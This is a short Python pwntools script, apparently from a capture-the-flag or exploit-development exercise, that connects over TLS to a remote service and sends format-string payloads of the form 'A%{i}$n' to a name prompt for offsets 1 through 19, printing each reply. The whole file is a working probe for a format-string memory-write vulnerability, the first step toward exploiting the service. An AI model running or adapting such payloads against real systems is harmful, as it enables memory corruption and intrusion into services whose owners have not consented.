from pwn import *

HOST = "xxx.vuln.gg"
PORT = 443

for i in range(1, 20):
    try:
        io = remote(HOST, PORT, ssl=True)
        io.recvuntil(b"What is your name?")
        io.sendline(bytes(f"A%{i}$n", "utf-8"))

        data = io.recvuntil(b"Enter a command:").decode()
        print(f"[offset {i}] {data}")

        io.close()

    except Exception as e:
        print(f"[offset {i}] error: {e}")
